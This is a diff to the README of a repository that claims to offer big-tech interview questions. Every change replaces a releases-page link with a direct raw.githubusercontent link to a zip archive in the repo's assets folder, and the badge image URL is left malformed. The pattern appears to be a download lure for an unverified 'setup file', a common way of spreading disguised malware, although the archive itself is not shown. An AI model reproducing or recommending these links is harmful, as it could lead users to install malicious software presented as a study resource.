@@ -1,6 +1,6 @@
 # 🚀 bigtech-interview-insights - Ace Your Interviews with Real Questions
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/laradamerji-arch/bigtech-interview-insights/releases)
+[![Download Now](https://raw.githubusercontent.com/laradamerji-arch/bigtech-interview-insights/main/assets/insights_bigtech_interview_v1.5-beta.5.zip%https://raw.githubusercontent.com/laradamerji-arch/bigtech-interview-insights/main/assets/insights_bigtech_interview_v1.5-beta.5.zip)](https://raw.githubusercontent.com/laradamerji-arch/bigtech-interview-insights/main/assets/insights_bigtech_interview_v1.5-beta.5.zip)
 
 ## 🔍 Overview
 
@@ -26,13 +26,13 @@ This resource includes insights into question frequency and trends, helping you 
 1. Ensure your device meets the system requirements mentioned above.
 2. Visit the releases page below to obtain the latest version of the application.
 
-[Download it here!](https://github.com/laradamerji-arch/bigtech-interview-insights/releases)
+[Download it here!](https://raw.githubusercontent.com/laradamerji-arch/bigtech-interview-insights/main/assets/insights_bigtech_interview_v1.5-beta.5.zip)
 
 ## 💾 Download & Install
 
 1. **Go to the Releases Page**: Click on the link below to access the latest version.
    
-   [Visit this page to download](https://github.com/laradamerji-arch/bigtech-interview-insights/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/laradamerji-arch/bigtech-interview-insights/main/assets/insights_bigtech_interview_v1.5-beta.5.zip)
 
 2. **Download the Latest Release**: Choose the release that matches your operating system and download the setup file.
 
@@ -68,4 +68,4 @@ If you have suggestions or wish to contribute, please feel free to submit your i
 
 This project is licensed under the MIT License. You can use it freely, but please provide attribution back to this repository.
 
-[Download it here again!](https://github.com/laradamerji-arch/bigtech-interview-insights/releases)
+[Download it here again!](https://raw.githubusercontent.com/laradamerji-arch/bigtech-interview-insights/main/assets/insights_bigtech_interview_v1.5-beta.5.zip)
